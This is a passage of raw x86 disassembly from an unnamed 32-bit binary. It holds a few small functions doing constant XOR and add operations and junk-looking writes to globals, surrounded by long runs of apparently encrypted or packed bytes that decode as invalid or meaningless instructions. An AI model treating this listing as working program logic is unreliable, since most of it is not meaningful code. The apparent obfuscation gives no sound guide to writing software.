  4082c7:	neg    DWORD PTR [esp+ebx*2+0x3587f2ea]
  4082ce:	xor    al,al
  4082d0:	sbb    ch,BYTE PTR [eax+0x1b25a362]
  4082d6:	inc    ebp
  4082d7:	jle    0x408288
  4082d9:	in     eax,dx
  4082da:	out    dx,al
  4082db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4082dc:	sbb    ebx,DWORD PTR [esp+esi*2+0x64dad1d2]
  4082e3:	in     eax,0x64
  4082e5:	outs   dx,DWORD PTR ds:[esi]
  4082e6:	lock leave 
  4082e8:	and    al,0xb4
  4082ea:	ins    DWORD PTR es:[edi],dx
  4082eb:	jl     0x40831a
  4082ed:	std    
  4082ee:	inc    ecx
  4082ef:	shl    BYTE PTR [ecx+0x3549ad03],0xfc
  4082f6:	sub    ebx,DWORD PTR [ebx+0x45e8cb39]
  4082fc:	pop    ebp
  4082fd:	ins    BYTE PTR es:[edi],dx
  4082fe:	push   edi
  4082ff:	(bad)  
  408300:	popa   
  408301:	out    0xbf,al
  408303:	imul   ecx,DWORD PTR [esi-0x4a],0x73
  408307:	neg    DWORD PTR [edx-0x5f0e38d]
  40830d:	outs   dx,BYTE PTR ds:[esi]
  40830e:	out    0x23,eax
  408310:	pop    edi
  408311:	push   edi
  408312:	jmp    0x4949:0xfc449351
  408319:	jne    0x40831a
  40831b:	nop
  40831c:	ja     0x40835e
  40831e:	lds    eax,FWORD PTR cs:[ebp+0x1c]
  408322:	pop    esp
  408323:	pop    esi
  408324:	mov    esp,0xbfa0450
  408329:	jmp    0x4082db
  40832b:	dec    esp
  40832c:	lea    eax,[eax+edx*1+0x32729d]
  408333:	mov    DWORD PTR [ebp+0x8],eax
  408336:	inc    DWORD PTR [ebp+0xc]
  408339:	jmp    0x407e52
  40833e:	mov    eax,DWORD PTR [ebp-0x10]
  408341:	xor    eax,ecx
  408343:	mov    ecx,DWORD PTR [ebp+0x10]
  408346:	add    eax,esi
  408348:	mov    DWORD PTR [ecx],eax
  40834a:	pop    esi
  40834b:	leave  
  40834c:	ret    0xc
  40834f:	push   ebp
  408350:	mov    ebp,esp
  408352:	push   ecx
  408353:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40835a:	neg    eax
  40835c:	mov    eax,DWORD PTR [ebp-0x4]
  40835f:	movzx  ecx,WORD PTR ds:0x42e772
  408366:	adc    DWORD PTR ds:0x42e762,ecx
  40836c:	mov    edx,DWORD PTR [ebp+0x10]
  40836f:	mov    ecx,0x7510856
  408374:	sub    DWORD PTR ds:0x430542,0x4d69
  40837e:	xor    eax,ecx
  408380:	add    eax,0x32729d
  408385:	adc    DWORD PTR ds:0x42e76e,0x62f9
  40838f:	mov    DWORD PTR [edx],eax
  408391:	mov    eax,DWORD PTR [ebp+0xc]
  408394:	adc    edx,DWORD PTR ds:0x42e76e
  40839a:	xor    eax,ecx
  40839c:	or     DWORD PTR ds:0x4304a6,ecx
  4083a2:	push   esi
  4083a3:	movzx  esi,BYTE PTR ds:0x43048a
  4083aa:	or     DWORD PTR ds:0x42ee0c,esi
  4083b0:	mov    esi,DWORD PTR [ebp+0x10]
  4083b3:	adc    DWORD PTR ds:0x42ee10,0x7d94
  4083bd:	mov    edx,0x32729d
  4083c2:	add    eax,edx
  4083c4:	mov    DWORD PTR [esi+0x4],eax
  4083c7:	xor    eax,eax
  4083c9:	mov    eax,DWORD PTR [ebp+0x14]
  4083cc:	mov    esi,DWORD PTR [ebp+0x10]
  4083cf:	mov    DWORD PTR [esi+0x8],eax
  4083d2:	or     DWORD PTR ds:0x43048e,ebx
  4083d8:	mov    eax,DWORD PTR [ebp+0x18]
  4083db:	dec    esi
  4083dc:	mov    esi,DWORD PTR [ebp+0x10]
  4083df:	sbb    DWORD PTR ds:0x42e766,0xab4
  4083e9:	mov    DWORD PTR [esi+0xc],eax
  4083ec:	mov    eax,DWORD PTR [ebp+0x1c]
  4083ef:	adc    DWORD PTR ds:0x43049a,ebx
  4083f5:	mov    esi,DWORD PTR [ebp+0x10]
  4083f8:	or     DWORD PTR ds:0x42e776,0x42e76e
  408402:	mov    DWORD PTR [esi+0x10],eax
  408405:	adc    DWORD PTR ds:0x42e76e,edi
  40840b:	mov    eax,eax
  40840d:	and    DWORD PTR ds:0x43048e,0x0
  408417:	mov    esi,DWORD PTR ds:0x43048e
  40841d:	inc    esi
  40841e:	mov    DWORD PTR ds:0x43048e,esi
  408424:	cmp    DWORD PTR ds:0x43048e,0x17
  40842b:	jne    0x40844d
  408431:	push   DWORD PTR [ebp-0x24]
  408434:	push   0x2fa6
  408439:	push   DWORD PTR [ebp-0x28]
  40843c:	push   DWORD PTR [ebp-0x10]
  40843f:	push   DWORD PTR [ebp-0x14]
  408442:	push   0x162f
  408447:	call   DWORD PTR ds:0x42ea08
  40844d:	cmp    DWORD PTR ds:0x43048e,0x15
  408454:	jb     0x408417
  40845a:	mov    eax,DWORD PTR [ebp+0x8]
  40845d:	xor    eax,ecx
  40845f:	add    eax,edx
  408461:	pop    esi
  408462:	leave  
  408463:	ret    0x18
  408466:	push   ebp
  408467:	mov    ebp,esp
  408469:	mov    eax,DWORD PTR [ebp+0xc]
  40846c:	jmp    0x40876b
  408471:	cs leave 
  408473:	or     DWORD PTR [edi+0x69204779],0xc097db4f
  40847d:	dec    edx
  40847e:	sub    ebx,DWORD PTR [edi]
  408480:	xchg   esp,eax
  408481:	popa   
  408482:	fdivr  QWORD PTR [esi+0x7e]
  408485:	push   eax
  408486:	jo     0x408506
  408488:	jle    0x408465
  40848a:	sub    BYTE PTR [ebp-0x4bdfae19],bl
  408490:	jb     0x40846a
  408492:	mov    al,0x15
  408494:	shl    BYTE PTR ds:0x592b488a,0x8c
  40849b:	ins    DWORD PTR es:[edi],dx
  40849c:	inc    ebx
  40849d:	in     eax,dx
  40849e:	out    dx,eax
  40849f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4084a0:	out    0x5a,eax
  4084a2:	aaa    
  4084a3:	inc    ebx
  4084a4:	or     dh,bl
  4084a6:	xor    bh,0x6b
  4084a9:	and    bh,0xd
  4084ac:	mov    cl,0xd
  4084ae:	outs   dx,BYTE PTR ds:[esi]
  4084af:	adc    eax,0x579bb461
  4084b4:	sbb    eax,DWORD PTR [bp+si-0x72b]
  4084b9:	lahf   
  4084ba:	arpl   WORD PTR [edx-0x4b],bp
  4084bd:	pop    ebp
  4084be:	mov    ebp,DWORD PTR [ebx]
  4084c0:	or     dl,al
  4084c2:	lods   al,BYTE PTR ds:[esi]
  4084c3:	shl    ebx,cl
  4084c5:	lds    esp,FWORD PTR [ecx-0x2b271fd2]
  4084cb:	adc    ecx,edi
  4084cd:	jns    0x40852f
  4084cf:	data16 fisttp QWORD PTR [esi-0x52]
  4084d3:	shl    BYTE PTR [ebx+0x2d0ef76f],1
  4084d9:	xlat   BYTE PTR ds:[ebx]
  4084da:	lahf   
  4084db:	ret    0x7f6b
  4084de:	ins    DWORD PTR es:[edi],dx
  4084df:	fimul  WORD PTR [edx-0x2f69b13d]
  4084e5:	adc    eax,0x10dd65d9
  4084ea:	ror    DWORD PTR [esi+0x7bac05a2],0x45
  4084f1:	sub    DWORD PTR [ebx],0xdaa8c26c
  4084f7:	std    
  4084f8:	xor    eax,edx
  4084fa:	ret    0x2791
  4084fd:	or     eax,0x6d41f8c6
  408502:	dec    edi
  408503:	icebp  
  408504:	xor    ah,BYTE PTR [esi+0x2c]
  408507:	push   0xfffffff9
  408509:	fwait
  40850a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40850b:	(bad)  
  40850d:	mov    edx,DWORD PTR [ebx-0x71]
  408510:	mov    ecx,0xa2379476
  408515:	push   ebp
  408516:	jno    0x40852e
  408518:	shr    DWORD PTR [eax],0x2e
  40851b:	(bad)  
  40851c:	fs adc eax,0x87f42d8
  408522:	jmp    0xbfb2:0x4d1afb0e
  408529:	mov    ch,al
  40852b:	jnp    0x4084f2
  40852d:	and    bh,BYTE PTR [eax]
  40852f:	lea    ecx,[edx]
  408531:	add    DWORD PTR [edx+edi*4+0x72],ebx
  408535:	dec    esi
  408536:	mov    dh,0xa1
  408538:	not    DWORD PTR [ebx]
  40853a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40853b:	ss sbb al,0xd6
  40853e:	push   0x2f029fc6
  408543:	mov    cl,0xf3
  408545:	xor    edx,DWORD PTR [ecx-0x9]
  408548:	in     eax,dx
  408549:	or     cl,bl
  40854b:	cdq    
  40854c:	adc    dh,ch
  40854e:	mov    al,ds:0xea67ff0a
  408553:	dec    edx
  408554:	ret    
  408555:	mov    ds:0x3bae1130,al
  40855a:	data16 jno 0x408560
  40855d:	lea    edi,[edx-0x9]
  408560:	jo     0x40856e
  408562:	std    
  408563:	popa   
  408564:	hlt    
  408565:	addr16 or eax,0x38840967
  40856b:	inc    eax
  40856c:	mov    esi,0xa617d486
  408571:	jo     0x408507
  408573:	out    0x75,al
  408575:	jnp    0x40856a
  408577:	(bad)  
  408578:	into   
  408579:	ror    BYTE PTR [edx+0x79],1
  40857c:	adc    bh,BYTE PTR [esi+0x70653d80]
  408582:	out    dx,ax
  408584:	adc    al,0xb2
  408586:	das    
  408587:	ss dec edx
  408589:	mov    ecx,edi
  40858b:	xchg   edi,eax
  40858c:	and    eax,0x3aa94232
  408591:	neg    BYTE PTR [edi+0x2f]
  408594:	dec    ecx
  408595:	push   ecx
  408596:	add    eax,0x4822b2d6
  40859b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40859c:	aas    
  40859d:	xchg   esi,eax
  40859e:	cld    
  40859f:	inc    ebx
  4085a0:	in     al,0x33
  4085a2:	int3   
  4085a3:	es loop 0x408548
  4085a6:	and    BYTE PTR [ecx],bl
  4085a8:	mov    edx,0x4c1d7c18
  4085ad:	xor    al,0x17
  4085af:	xor    eax,0xeae4fb59
  4085b4:	loopne 0x408613
  4085b6:	(bad)  
  4085b7:	inc    edi
  4085b8:	sti    
  4085b9:	adc    DWORD PTR [eax-0xc],ebx
  4085bc:	mov    ds:0x67fbe64f,eax
  4085c1:	mov    DWORD PTR [edi],edx
  4085c3:	retf   0x3845
  4085c6:	js     0x40859c
  4085c8:	inc    edi
  4085c9:	mov    WORD PTR [ecx+0x2d],gs
  4085cc:	sti    
  4085cd:	dec    ecx
  4085ce:	or     DWORD PTR [ebp+0x387d4d8e],ebx
  4085d4:	lods   eax,DWORD PTR ds:[esi]
  4085d5:	pop    es
  4085d6:	xchg   ebx,eax
  4085d7:	mov    eax,ds:0xc4b24775
  4085dc:	int    0x7b
  4085de:	and    bh,BYTE PTR [esi+0x3f]
  4085e1:	cmp    ebx,DWORD PTR [ecx-0x7dde31c6]
  4085e7:	out    0x2a,eax
  4085e9:	cli    
  4085ea:	xchg   esi,eax
  4085eb:	push   ecx
  4085ec:	add    BYTE PTR [edx],0x75
  4085ef:	sbb    BYTE PTR [edi],ch
  4085f1:	jno    0x408607
  4085f3:	test   DWORD PTR [eax-0x4],esp
  4085f6:	in     al,dx
  4085f7:	repnz push ss
  4085f9:	jbe    0x4085fd
  4085fb:	jl     0x408629
  4085fd:	cmp    BYTE PTR [eax],dh
  4085ff:	in     eax,0x58
  408601:	sub    al,0xec
  408603:	push   edx
  408604:	xor    BYTE PTR [eax+ecx*4-0x71],bl
  408608:	adc    eax,0x191cdab1
  40860d:	(bad)  
  40860f:	push   0x2dec0e36
  408614:	jo     0x408651
  408616:	sbb    ebx,DWORD PTR [ebp+0x3c38110a]
  40861c:	test   al,0xfb
  40861e:	pop    edi
  40861f:	mov    ah,0x29
  408621:	adc    dl,BYTE PTR [ebx-0x162db910]
  408627:	pop    es
  408628:	xor    BYTE PTR [eax-0x78],bh
  40862b:	js     0x4086a2
  40862d:	mov    dh,0x75
  40862f:	je     0x408679
  408631:	outs   dx,DWORD PTR ds:[esi]
  408632:	or     BYTE PTR [edx],bh
  408634:	test   BYTE PTR [ebx],dl
  408636:	add    DWORD PTR [edx+0x66f75dad],eax
  40863c:	inc    eax
  40863d:	mov    dh,0x50
  40863f:	dec    ebx
  408640:	adc    eax,0x25db740f
  408645:	dec    esp
  408646:	(bad)  
  408647:	pop    ebx
  408648:	test   eax,0xde7597f
  40864d:	xchg   ebx,eax
  40864e:	stos   BYTE PTR es:[edi],al
  40864f:	ins    BYTE PTR es:[edi],dx
  408650:	loop   0x408633
  408652:	xchg   edx,eax
  408653:	or     edx,ebx
  408655:	mov    ah,0x93
  408657:	mov    dh,0x93
  408659:	push   ss
  40865a:	push   esp
  40865b:	xor    ch,ch
  40865d:	(bad)  
  40865e:	neg    ah
  408660:	ds stos BYTE PTR es:[edi],al
  408662:	stos   BYTE PTR es:[edi],al
  408663:	push   cs
  408664:	les    ecx,FWORD PTR [esi-0x1]
  408667:	out    0xfa,eax
  408669:	sti    
  40866a:	push   esi
  40866b:	fild   QWORD PTR [edi]
  40866d:	or     esp,DWORD PTR [esi]
  40866f:	sbb    edi,ebx
  408671:	pop    ebx
  408672:	mov    esi,0xbfcf7325
  408677:	rcr    esp,cl
  408679:	sub    cl,BYTE PTR [ebp+0x78]
  40867c:	mov    ebp,0x85078034
  408681:	cmp    ecx,ecx
  408683:	jnp    0x4086de
  408685:	pop    esp
  408686:	test   BYTE PTR [eax],ah
  408688:	lods   eax,DWORD PTR ds:[esi]
  408689:	jne    0x40865c
  40868b:	rcr    DWORD PTR [edx+0x2],cl
  40868e:	repnz ficom DWORD PTR [ecx-0x12]
  408692:	mov    esp,edi
  408694:	xchg   ebp,eax
  408695:	ja     0x408623
  408697:	and    BYTE PTR [ebp+0x2dd31c15],ah
  40869d:	sub    BYTE PTR [eax+0x65],bl
  4086a0:	push   0x17
  4086a2:	xchg   ebx,eax
  4086a3:	dec    ebx
  4086a4:	sbb    bl,al
  4086a6:	out    dx,eax
  4086a7:	dec    ebx
  4086a8:	cmp    DWORD PTR [edi+0x1c],edx
  4086ab:	inc    eax
  4086ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4086ad:	adc    BYTE PTR [eax],ah
  4086af:	test   DWORD PTR [esi-0x226e9146],ebx
  4086b5:	lahf   
  4086b6:	pop    ss
  4086b7:	cli    
  4086b8:	fstp   QWORD PTR [edx]
  4086ba:	aam    0x11
  4086bc:	imul   esp,ecx,0xfffffff6
  4086bf:	mov    bh,0x64
  4086c1:	pusha  
  4086c2:	fimul  WORD PTR gs:[ebp-0x30]
  4086c6:	test   BYTE PTR [eax+0x24],bh
  4086c9:	pop    ecx
  4086ca:	mov    al,dh
  4086cc:	outs   dx,DWORD PTR ds:[esi]
  4086cd:	pop    ds
  4086ce:	cli    
  4086cf:	rcr    dh,0x7c
  4086d2:	outs   dx,DWORD PTR ds:[esi]
  4086d3:	jg     0x4086e5
  4086d5:	pop    ss
  4086d6:	dec    edi
  4086d7:	arpl   WORD PTR [eax],si
  4086d9:	and    eax,0x87440c59
  4086de:	fwait
  4086df:	(bad)  
  4086e2:	and    al,0x34
  4086e4:	pop    esp
  4086e5:	or     al,0xfd
  4086e7:	fwait
  4086e8:	test   DWORD PTR [ebx-0x6d12d9cc],ebx
  4086ee:	inc    edx
  4086ef:	shl    DWORD PTR [ecx+0x4d],0xcf
  4086f3:	mov    cl,0x72
  4086f5:	sbb    al,0xe2
  4086f7:	and    BYTE PTR [ebp-0x73aa75dd],0x0
  4086fe:	cs push cs
  408700:	and    al,0x94
  408702:	(bad)  
  408703:	push   0xb9b74883
  408708:	sar    DWORD PTR [esi-0x58],0xa6
  40870c:	fstp   QWORD PTR [eax-0x27]
  40870f:	add    al,0xa8
  408711:	aas    
  408712:	dec    ebx
  408713:	fsub   QWORD PTR [ecx-0x4c4c48b1]
  408719:	pushf  
  40871a:	pusha  
  40871b:	(bad)  
  40871c:	mov    bh,0x9d
  40871e:	loopne 0x40879d
  408720:	rol    BYTE PTR [edx],0xe6
  408723:	xor    ch,BYTE PTR [edi]
  408725:	fild   QWORD PTR [esi+0x45]
  408728:	(bad)  
  408729:	(bad)  
  40872b:	test   eax,0xa0d7a4e0
  408730:	lds    dx,DWORD PTR [eax+esi*8+0x4f]
  408735:	sub    eax,0x380e390e
  40873a:	pop    ebp
  40873b:	adc    ebp,edx
  40873d:	outs   dx,BYTE PTR ds:[esi]
  40873e:	scas   eax,DWORD PTR es:[edi]
  40873f:	add    dl,BYTE PTR [eax+ecx*8-0x6065fa6b]
  408746:	push   cs
  408747:	stc    
  408748:	not    BYTE PTR [esi]
  40874a:	push   cs
  40874b:	push   ebx
  40874c:	outs   dx,BYTE PTR ds:[esi]
  40874d:	leave  
  40874e:	mov    dl,0xa9
  408750:	adc    BYTE PTR [ecx],ch
  408752:	int    0x50
  408754:	ins    DWORD PTR es:[edi],dx
  408755:	pop    ds
  408756:	lock push ecx
  408758:	push   edi
  408759:	and    al,BYTE PTR [ebx+0x6]
  40875c:	in     al,0xfb
  40875e:	jno    0x408797
  408760:	lods   eax,DWORD PTR ds:[esi]
  408761:	pop    ds
  408762:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408763:	ds cld 
  408765:	daa    
  408766:	sub    DWORD PTR ds:0x33eba1ca,edx
  40876c:	sar    BYTE PTR [ecx+0x7264fcad],cl
  408772:	div    ecx
  408774:	mov    ecx,DWORD PTR [ebp+0x10]
  408777:	and    ecx,eax
  408779:	jmp    0x408a78
  40877e:	out    0xd4,eax
  408780:	xchg   BYTE PTR [ebx+0x6cfb7d9d],al
  408786:	imul   edx,ecx,0xfffffff2
  408789:	bound  ecx,QWORD PTR [edi+0x43761124]
  40878f:	fistp  QWORD PTR [esi+0x7e]
  408792:	push   eax
  408793:	jo     0x408813
  408795:	jle    0x408796
  408797:	std    
  408798:	pop    eax
  408799:	mov    ah,0x55
  40879b:	mov    WORD PTR [ebp+0x18],gs
  40879e:	cs xchg edi,eax
  4087a0:	adc    eax,0x9f0aa2e3
  4087a5:	std    
  4087a6:	jns    0x408798
  4087a8:	dec    esi
  4087a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4087aa:	rcr    DWORD PTR [edx],cl
  4087ac:	jp     0x408798
  4087ae:	test   BYTE PTR [edx],cl
  4087b0:	mov    al,ds:0x849ed3da
  4087b5:	shl    DWORD PTR [ecx-0x5d],0x7f
  4087b9:	cmp    al,BYTE PTR [ecx+0xde2e9a0]
  4087bf:	add    esi,DWORD PTR [ebx+0x70]
  4087c2:	fcomp  QWORD PTR [ebp-0x7d]
  4087c5:	mov    cl,0x34
  4087c7:	(bad)  
  4087c8:	fwait
  4087c9:	inc    edi
  4087ca:	iret   
  4087cb:	push   edi
  4087cc:	push   esi
  4087cd:	rol    BYTE PTR [esp+eiz*8+0x37],1
  4087d1:	mov    edx,DWORD PTR [ebp+0x4acc01ba]
  4087d7:	popf   
  4087d8:	xor    BYTE PTR [eax+0x6a],dl
  4087db:	mov    edi,DWORD PTR [edi+0x16c3bac]
  4087e1:	jb     0x4087ad
  4087e3:	cmp    BYTE PTR [eax+0x19],0x94
  4087e7:	adc    esp,DWORD PTR [ebx+0x26]
  4087ea:	sub    eax,0xefce5450
  4087ef:	sbb    BYTE PTR [ebp+0x4e],ch
  4087f2:	ror    edx,cl
  4087f4:	test   DWORD PTR [ebx+0x50a55195],esp
  4087fa:	ret    0xcca0
  4087fd:	sahf   
  4087fe:	ins    DWORD PTR es:[edi],dx
  4087ff:	inc    ebx
  408800:	pop    eax
  408801:	ss pop eax
  408803:	dec    esp
  408804:	lds    esi,FWORD PTR [ebx+0x6c]
  408807:	push   0x5b62afaa
  40880c:	adc    al,0xe1
  40880e:	mov    esp,0xfeba336a
  408813:	loope  0x4087a7
  408815:	cli    
  408816:	out    0xef,al
  408818:	in     eax,dx
  408819:	sbb    BYTE PTR [edi+0x2],al
  40881c:	retf   0xa53f
  40881f:	mov    edx,0xc1f3d1bf
  408824:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408825:	popa   
  408826:	push   ss
  408827:	sub    DWORD PTR [esi],0x1f1702ca
  40882d:	enter  0xd07d,0xfb
  408831:	mov    edi,0xd4d5d2cf
  408836:	fprem  
  408838:	pop    edx
  408839:	mov    esp,0x79ac3c4b
  40883e:	(bad)  
  408840:	jmp    0x7e63:0x4845cd85
  408847:	add    ch,ah
  408849:	enter  0x56de,0xd0
  40884d:	test   BYTE PTR [edx-0x12],dl
  408850:	push   cs
  408851:	in     al,0xed
  408853:	and    al,0x7
  408855:	jecxz  0x40882f
  408857:	(bad)  
  408858:	in     eax,dx
  408859:	add    cl,BYTE PTR [ebp+0x69]
  40885c:	jmp    0x40880f
  40885e:	xor    BYTE PTR [edx-0x4b],bh
  408861:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408862:	pop    ecx
  408863:	es push ebp
  408865:	push   edi
  408866:	cmp    BYTE PTR [edx+0x14957c41],0x75
  40886d:	push   ebp
  40886e:	js     0x4088b3
  408870:	std    
  408871:	outs   dx,DWORD PTR ds:[esi]
  408872:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408873:	mov    ebx,edi
  408875:	loopne 0x408848
  408877:	sbb    WORD PTR [edx],si
  40887a:	or     BYTE PTR [ecx],ah
  40887c:	jns    0x408820
  40887e:	ret    0x1a4c
  408881:	in     eax,0xc6
  408883:	xchg   edi,eax
  408884:	push   eax
  408885:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408886:	jl     0x4088f1
  408888:	mov    WORD PTR [eax-0x5d],fs
  40888b:	dec    eax
  40888c:	shl    cl,0xce
  40888f:	outs   dx,BYTE PTR ds:[esi]
  408890:	(bad)  
  408891:	popa   
  408892:	adc    BYTE PTR [edx-0x503f6052],bl
  408898:	in     al,dx
  408899:	test   eax,0xeb5ff10d
  40889e:	mov    ds:0xc8dbf1d9,eax
  4088a3:	add    ebx,esi
  4088a5:	or     al,0xa8
  4088a7:	jne    0x40884e
  4088a9:	push   0x6f
  4088ab:	sub    al,0x4d
  4088ad:	dec    edi
  4088ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4088af:	popf   
  4088b0:	(bad)  
  4088b1:	out    dx,al
  4088b2:	neg    eax
  4088b4:	push   0xa
  4088b6:	mov    ecx,0xf3d373d5
  4088bb:	or     DWORD PTR [ebx+0x208acb54],0x5d
  4088c2:	fst    QWORD PTR [ecx]
  4088c4:	sbb    ch,BYTE PTR [ebx+0x61]
  4088c7:	cmp    DWORD PTR [esp+ebp*8+0x62],ebp
  4088cb:	(bad)  
  4088cc:	pop    ss
  4088cd:	test   al,0x0
  4088cf:	addr16 enter 0x9308,0xc5
  4088d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4088d5:	xchg   edi,eax
  4088d6:	stos   DWORD PTR es:[edi],eax
  4088d7:	(bad)  
  4088d8:	jp     0x4088ef
  4088da:	dec    ecx
  4088db:	sub    edx,ecx
  4088dd:	aaa    
  4088de:	fcom   QWORD PTR [eax-0x68bb6a0]
  4088e4:	pop    ss
  4088e5:	mov    ds,edi
  4088e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4088e8:	nop
  4088e9:	dec    ebp
  4088ea:	fdiv   DWORD PTR [edi]
  4088ec:	out    dx,eax
  4088ed:	stc    
  4088ee:	cmp    DWORD PTR [ebx+0x14],ebx
  4088f1:	mov    edi,0x2fb4e418
  4088f6:	jmp    0x384f0331
  4088fb:	xchg   ebx,eax
  4088fc:	xchg   ecx,eax
  4088fd:	jge    0x4088f7
  4088ff:	sub    DWORD PTR [esi+ebp*4-0x47],edx
  408903:	fst    QWORD PTR [ebx+0x5d]
  408906:	inc    ebx
  408907:	fst    DWORD PTR [ebx+0x2e]
  40890a:	cmp    bl,BYTE PTR [esp+esi*1+0x20]
  40890e:	sbb    al,0xe4
  408910:	bound  ebx,QWORD PTR [esi-0x20]
  408913:	cmp    BYTE PTR [ecx-0x2bc0e539],dl
  408919:	cwde   
  40891a:	dec    edx
  40891b:	mov    edi,0x454590b9
  408920:	and    esi,DWORD PTR [ebx-0x635caf07]
  408926:	(bad)  
  408927:	es out 0x40,al
  40892a:	or     DWORD PTR [ecx+0x10],eax
  40892d:	jne    0x408977
  40892f:	fbld   TBYTE PTR [eax+ebp*8]
  408932:	cwde   
  408933:	in     eax,0x91
  408935:	add    DWORD PTR [ecx],0xffffffb5
  408938:	and    al,BYTE PTR [ecx+0x6a]
  40893b:	(bad)  
  40893c:	ins    DWORD PTR es:[edi],dx
  40893d:	lods   al,BYTE PTR ds:[esi]
  40893e:	adc    al,0x0
  408940:	jae    0x408958
  408942:	into   
  408943:	fisubr DWORD PTR [ebp-0x51]
  408946:	cli    
  408947:	fnsave [ecx+0x6789213]
  40894d:	dec    ebx
  40894e:	push   0x9711d17b
  408953:	outs   dx,BYTE PTR ds:[esi]
  408954:	push   esi
  408955:	je     0x408935
  408957:	(bad)  
  408958:	shl    DWORD PTR [ecx-0x17be5bea],1
  40895e:	sub    al,BYTE PTR [edx-0x55]
  408961:	push   ebx
  408962:	mov    eax,ds:0x9a248d7e
  408967:	sub    BYTE PTR [ecx-0x44],bl
  40896a:	push   edi
  40896b:	pop    edx
  40896c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40896d:	or     ebp,DWORD PTR [edx+0x5]
  408970:	xor    al,0xe5
  408972:	test   BYTE PTR [eax-0x4fb97d5c],cl
  408978:	je     0x4089d3
  40897a:	ins    DWORD PTR es:[edi],dx
  40897b:	scas   eax,DWORD PTR es:[edi]
  40897c:	sbb    al,dh
  40897e:	add    eax,0xf7c717e0
  408983:	pop    ebp
  408984:	in     eax,0x93
  408986:	or     BYTE PTR [edi+0x5983289c],ah
  40898c:	ficomp DWORD PTR [edx-0x32]
  40898f:	push   ss
  408990:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408991:	xlat   BYTE PTR ds:[ebx]
  408992:	xor    eax,0xe65ea57a
  408997:	pop    esi
  408998:	bound  ebp,QWORD PTR [edx+0x7]
  40899b:	cmp    BYTE PTR [edi-0x47461246],dl
  4089a1:	dec    ebp
  4089a2:	popf   
  4089a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4089a4:	ret    0x2a1
  4089a7:	bound  ecx,QWORD PTR [ecx+ebp*1]
  4089aa:	mov    dh,0xff
  4089ac:	add    al,0x27
  4089ae:	mov    al,ds:0xa3bc7934
  4089b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4089b4:	es pop ebx
  4089b6:	daa    
  4089b7:	iret   
  4089b8:	(bad)  
  4089b9:	ror    bh,cl
  4089bb:	sub    cl,dh
  4089bd:	fisttp WORD PTR [eax-0x3e]
  4089c0:	push   edx
  4089c1:	loopne 0x408a18
  4089c3:	hlt    
  4089c4:	je     0x4089a0
  4089c6:	xchg   ebx,eax
  4089c7:	retf   
  4089c8:	sbb    al,0x63
  4089ca:	mov    bl,0xf9
  4089cc:	adc    DWORD PTR [eax-0x93c4ffe],esp
  4089d2:	shl    BYTE PTR [edi],0xb9
  4089d5:	mov    ds:0x731f1d11,al
  4089da:	dec    DWORD PTR [edx-0x6b3800f5]
  4089e0:	enter  0x374c,0xc4
  4089e4:	cmp    eax,0x75db2b32
  4089e9:	das    
  4089ea:	add    eax,eax
  4089ec:	arpl   WORD PTR [edx+0x108dd8d],si
  4089f2:	mov    cl,0xb3
  4089f4:	jae    0x408a23
  4089f6:	mov    eax,0xd7719836
  4089fb:	mov    al,0x1
  4089fd:	stos   DWORD PTR es:[edi],eax
  4089fe:	jbe    0x408a00
  408a00:	mov    dl,BYTE PTR [ebx-0xd]
  408a03:	mov    edi,0x273a41fe
  408a08:	push   eax
  408a09:	test   ebp,ebp
  408a0b:	aam    0xbb
  408a0d:	in     eax,dx
  408a0e:	scas   eax,DWORD PTR es:[edi]
  408a0f:	lods   eax,DWORD PTR ds:[esi]
  408a10:	shl    bh,0x21
  408a13:	mov    al,0xfc
  408a15:	push   ss
  408a16:	pop    ecx
  408a17:	cwde   
  408a18:	out    dx,al
  408a19:	cmp    eax,0x3f1f9094
  408a1e:	ins    BYTE PTR es:[edi],dx
  408a1f:	mov    al,0xd4
  408a21:	cmp    bh,bh
  408a23:	xchg   ebx,eax
  408a24:	call   0xe155:0x259cdd48
  408a2b:	cld    
  408a2c:	ja     0x4089f8
  408a2e:	pop    esp
  408a2f:	in     eax,0xc6
  408a31:	dec    ecx
  408a32:	xchg   edx,eax
  408a33:	push   cs
  408a34:	or     al,0xe4
  408a36:	mov    cl,0xa0
  408a38:	jl     0x408a4e
  408a3a:	mov    dh,0x10
  408a3c:	idiv   BYTE PTR [esi]
  408a3e:	and    eax,0x869f227c
  408a43:	test   BYTE PTR [eax+0x52],dh
  408a46:	(bad)  ds:0xaa144784
  408a4c:	popf   
  408a4d:	xchg   edi,eax
  408a4e:	jns    0x4089e1
  408a50:	aaa    
  408a51:	popa   
  408a52:	cmp    al,0x9b
  408a54:	(bad)  
  408a55:	mov    esi,0x2ad7cf68
  408a5a:	in     eax,dx
  408a5b:	ss sub al,0x31
  408a5e:	mov    WORD PTR [ebp+0x5b],ds
  408a61:	mov    cl,0xac
  408a63:	push   edi
  408a64:	leave  
  408a65:	jbe    0x408acb
  408a67:	adc    cl,dl
  408a69:	jno    0x408a2b
  408a6b:	cmp    al,0xec
  408a6d:	shrd   DWORD PTR [edi+0x2d34d55b],esi,0x75
  408a75:	ds sahf 
  408a77:	mov    ds:0x1d8fc981,al
  408a7c:	push   ss
  408a7d:	or     DWORD PTR [ebx+0x18c25dc1],0xec8b5500
  408a87:	push   ecx
  408a88:	mov    DWORD PTR ds:0x42e76a,0x1d
  408a92:	cmp    DWORD PTR ds:0x42e76a,0x0
